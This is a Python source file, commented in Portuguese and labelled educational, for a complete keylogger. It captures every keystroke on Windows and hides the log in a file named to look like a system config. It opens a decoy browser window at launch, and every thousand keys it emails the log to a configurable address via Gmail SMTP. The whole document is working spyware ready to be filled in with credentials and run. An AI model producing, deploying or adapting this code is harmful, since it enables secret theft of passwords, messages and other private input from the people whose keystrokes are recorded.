#========================================================
#|                                                      |
#|  Este projeto existe apenas para fins educacionais   |
#|                                                      |
#========================================================

import keyboard as kb
import datetime
import os
import smtplib
import webbrowser as wb
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Pegando o nome do usuário do sistema
system_name = os.getenv('USERNAME')

# Criando o path que o arquivo vai ficar
path = "C:/Win32/"
if not os.path.exists(path):
    os.mkdir(path)
filename = "win32config.txt"
file = open(f"{path}{filename}", 'a')

# Configs para o email
email_sender = ""                                   # Seu @gmail (ou derivados)
email_password = ""                                 # Senha de apps do google
email_receiver = ""                                 # Email que vai receber os arquivos
conteudo = "Arquivo de log capturado com python!"   # Mensagem de controle

# Função que retorna a hora atual em string
def get_hour():
    hora = datetime.datetime.now()
    hora = hora.strftime("%m-%d %H:%M:%S")
    hora = str(hora)
    return hora

# Função para abrir algo falso
def fake_browser():
    url = "https://"
    wb.open(url)

# Função para realizar o envio do email
def send_email():
    # Criando um objeto multi part e atribuindo os valores necessarios como remetente, destinatário e assunto do email
    msg = MIMEMultipart()
    msg['From'] = email_sender
    msg['To'] = email_receiver
    msg['Subject'] = f"Keylogger - {system_name} - {get_hour()}"
    msg.attach(MIMEText(conteudo)) # Anexa o conteudo
    with open(f"{path}{filename}", 'r') as attachment:
        attachment_content = attachment.read() # Abrindo o arquivo em modo leitura

    # MIMEBase é um obj para representar o anexo do email, ('application', 'octet-stream') são dados binários não especificos
    attachment = MIMEBase('application', 'octet-stream') 
    attachment.set_payload(attachment_content)
    encoders.encode_base64(attachment)
    attachment.add_header('Content-Disposition', f'attachment; filename= {filename}') # Garantindo que seja anexo e definindo um nome
    msg.attach(attachment) # Anexando de fato

    try:
        servidor_email = smtplib.SMTP('smtp.gmail.com', 587) # Configurando o servidor, podendo ser qualquer outro tipo de email
        servidor_email.starttls()
        servidor_email.login(email_sender, email_password) # Realizando login com sua própria conta
        servidor_email.sendmail(email_sender, email_receiver, msg.as_string()) # Enviando o email com as informações passadas anteriormente
        servidor_email.quit()
        print("Email enviado!")
    except Exception as e:
        print(f"Erro ao enviar o email: {e}")

def main():
    global file
    global tempo

    tempo = 0
    while True:
        try:
            # Timer + ou - funcional para o envio do email
            if tempo < 1000:
                tempo += 1
            else:
                file.close()
                send_email()
                tempo = 0

                # Abrir o arquivo novamente para escrita
                file = open(f"{path}{filename}", 'a')

            # Keylogger em si
            key = kb.read_key()
            if kb.is_pressed(key):
                print(key)
                
                # Tratando algumas possibilidades para evitar poluição do arquivo (switch case pref)
                if key == "space":
                    txt = ' '
                elif key == "enter":
                    txt = f" - {get_hour()}\n"
                elif key == "shift":
                    txt = ""
                elif key == "ctrl":
                    txt = f"({key})"
                elif key == "tab" or key == "alt":
                    txt = f"[{key}]"
                elif key == "backspace":
                    txt = "<X>"
                elif key == "capslock":
                    txt = f"[CL]"
                else:
                    txt = key
                # Escrevendo no arquivo
                file.write(txt)

        except Exception as e:
            print(f"Erro: {e}")
            break

if __name__ == "__main__":
    fake_browser()
    main()